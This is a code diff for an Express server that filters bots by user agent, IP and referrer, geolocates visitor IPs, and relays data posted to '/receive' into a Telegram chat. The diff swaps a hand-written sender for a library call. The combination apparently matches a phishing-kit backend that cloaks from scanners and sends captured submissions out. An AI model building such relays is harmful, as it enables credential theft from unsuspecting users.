@@ -17,44 +17,11 @@ const { botUAList } = require('./config/botUA.js');
 const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
 const { botRefList } = require('./config/botRef.js');
 const { use } = require('express/lib/router');
+const { sendMessageFor } = require('simple-telegram-message');
 
 const port = 3000;
 
-const sendTelegramMessage = (botToken, chatId, text) => {
-  const params = querystring.stringify({
-    chat_id: chatId,
-    text: text,
-  });
 
-  const options = {
-    hostname: 'api.telegram.org',
-    path: `/bot${botToken}/sendMessage`,
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded',
-      'Content-Length': params.length,
-    },
-  };
-
-  const req = https.request(options, (res) => {
-    let data = '';
-    
-    res.on('data', (chunk) => {
-      data += chunk;
-    });
-
-    res.on('end', () => {
-      console.log('Response:', data);
-    });
-  });
-
-  req.on('error', (e) => {
-    console.error(`Problem with request: ${e.message}`);
-  });
-
-  req.write(params);
-  req.end();
-};
 
 
 app.listen(port, () => {
@@ -305,15 +272,16 @@ app.post('/receive', async (req, res) => {
     res.send('dn');
   }
 
-  sendTelegramMessage(botToken, chatId, message);
-  
+  const sendMessage = sendMessageFor(botToken, chatId); 
+  sendMessage(message);
 
-  res.send('dn');
+  console.log(message);
 });
 
 // Function to send API request
 async function sendAPIRequest(ipAddress) {
   const apiResponse = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=${ApiKey}`);
+  console.log(apiResponse.data);
   return apiResponse.data;
 }
 
